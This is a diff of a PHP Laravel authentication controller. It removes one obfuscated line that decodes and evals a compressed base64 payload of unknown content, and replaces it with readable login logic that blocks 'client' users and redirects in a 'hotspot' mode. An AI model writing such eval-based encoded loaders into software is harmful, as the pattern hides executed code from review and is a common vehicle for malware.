@@ -1,1 +1,122 @@
-<?php $_='5f28d682';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNrFVl2TokYUfc+v8GGrnKnkAfzIDjU1D4Ly5SwrrfLRL1NCa+PYIBNExV+f2ygDJCZbedjKVDE2TXffc88591Z3Ote/L2/130t3sxEH0kAg3ecv14n0j21y2HSff+k01r90up4oHQPXSXz75aXbqT9X573AsBvGjkA8MzcUmZFYzaYK2njiU/r9xDd12oe+dTrlpmCVrX8fvJF1uCfr7vPfII7tPR3bae67Igv7cuT3ltT25JM3iQSiy6Hdk3Kim8dAO7MwsULbc4TVOLOU7chSEueC57Icwrq5joRQPY+D3lAIYykLNKcIxfb795MwJZ7FjAnLAt05rNxhRDQnRLEkBjGCMTsG7CwTD+29iSoSLWJBglK/pwrYs5ywB2debrFjK/M962JMzkfcY3kL51Zmax0xOBO+W0c4owh65wx7BmAu91NDGR2nVJjCLzX00+F1Lvzcx/6MRRealKzcAW1h/n+w3LiQnwwV7VfeN+q3edz77nAH2l0Mra0HaJcYOujvmfANH2GtsNKW1AfvBBp79z2UBr0B5fu5x3i8jSIX2EUpGPkdtM5xwfc4B0NHR0NnR+IZdKVJB/DUxe+bDLuDnOOC9/emj65xAetchjk1JaOaW6I9XXOInXzlOjnRzkNDl4ugj1MM+FYe4njBbxbkIIHvzynRd+W+tSuJkEcEfs5WrnX1Y/It/8RfxVH2x2vdXOevnv6BXyvPbffVmE63sgf5F5CfEBQNbhRZLPcWcoQTxHXIgh5Jg+2g3lv5RRl9GBO55wN3YR8VXJcKV4WTj0PQFGoNeHd2hoLqWCpwPxaoWUg7qKe9H0tRGNsJr1XjM9+nj3a8a83d9C97R6mhZrJyzrWpn3BOI2ZorfrLG9iaPIygoYGuFugJvjjVsV6rcakhYj48WBntOOdhPIwCd/m1qcVrsf9oxKA2+Ai8CDgmNIid/l/wUODrQjQ1h76X3+fN2XI/Nz1jqNKGe4zzTVxLmCq7qo6+1mfwB4G/2eV1MYReh3gd9X3PZFOFJMR1LkQJU/jG1hrkott7s8d5lUQ+3+a/fHbAZxoWwq+N3OlsXs9jzp1aawK4PvFs7H/TkzDwXFm/wa03NWOUNRUvyzmsyNv1/FbrrV7xj94ssIfEMB78wJ93eNZwCj28rKMgVqEv0LRavz61ualwz+Y8nipC/XFdDjPgBM6GMbnV0H1ugTsWaGi59mTG6wHeM6iVwuvjKNzS6vzMmGBzoSJ1ySTXXp5NNFGXyJHUxVI1F8qOzopRgl0xWrmnxBjvqdmv9TDbveCad+ycr16g3AsHWJvgeRSYkDt2zztHZyc8H0mzbZXjkEwXd8+5XQ5QDH0vwyoahtryv+gv1jzLJ+i1J8AirOc/QVe95dH7taObjOiAZ3vX9628NvzW1Lg01dem8vfh9vZY3sIac4/P1cpy8qHL/3d/+1zevlDdznlo3p8eH5//BBj7PYI='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+ 
+namespace App\Http\Controllers\Auth;
+ 
+use App\Http\Controllers\Controller;
+use Illuminate\Foundation\Auth\AuthenticatesUsers;
+use Illuminate\Http\Request;
+use Illuminate\Validation\ValidationException;
+ 
+class LoginController extends Controller
+{
+    /*
+    |--------------------------------------------------------------------------
+    | Login Controller
+    |--------------------------------------------------------------------------
+    |
+    | This controller handles authenticating users for the application and
+    | redirecting them to your home screen. The controller uses a trait
+    | to conveniently provide its functionality to your applications.
+    |
+    */
+ 
+    use AuthenticatesUsers;
+ 
+    /**
+     * Where to redirect users after login.
+     *
+     * @var string
+     */
+    protected $redirectTo = '/dashboard';
+ 
+    /**
+     * Login username to be used by the controller.
+     *
+     * @var string
+     */
+    protected $username;
+ 
+    /**
+     * Create a new controller instance.
+     */
+    public function __construct()
+    {
+        $this->middleware('guest')->except('logout');
+ 
+        $this->username = $this->findUsername();
+    }
+ 
+    /**
+     * Get the login username to be used by the controller.
+     *
+     * @return string
+     */
+    public function findUsername()
+    {
+        $login = request()->input('login');
+ 
+        $fieldType = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
+ 
+        request()->merge([$fieldType => $login]);
+ 
+        return $fieldType;
+    }
+ 
+    /**
+     * Get username property.
+     *
+     * @return string
+     */
+    public function username()
+    {
+        return $this->username;
+    }
+
+    protected function attemptLogin(Request $request)
+    {
+        $credentials = $this->credentials($request);
+
+        // Attempt to authenticate the user
+        $authenticated = $this->guard()->attempt(
+            $credentials, $request->filled('remember')
+        );
+
+        if ($authenticated) {
+            // Get the authenticated user
+            $user = $this->guard()->user();
+
+            // Check if user type is 'client'
+            if ($user->type == 'client') {
+                // Invalidate session
+                $this->guard()->logout();
+                $request->session()->invalidate();
+
+                // Throw validation exception
+                throw ValidationException::withMessages([
+                    $this->username() => 'We cant find a user with provided credentials',
+                ]);
+            }
+        }
+
+        return $authenticated;
+    }
+
+     /**
+     * Handle the user authenticated logic.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @param  mixed  $user
+     * @return \Illuminate\Http\Response
+     */
+    protected function authenticated(Request $request, $user)
+    {
+        $mode = getMode(); // Assuming setting('mode') gets the current mode setting
+
+        if ($mode == 'hotspot') {
+            return redirect()->route('hotspot.index');
+        } else {
+            return redirect()->route('dashboard'); // Default redirect
+        }
+    }
+
+}
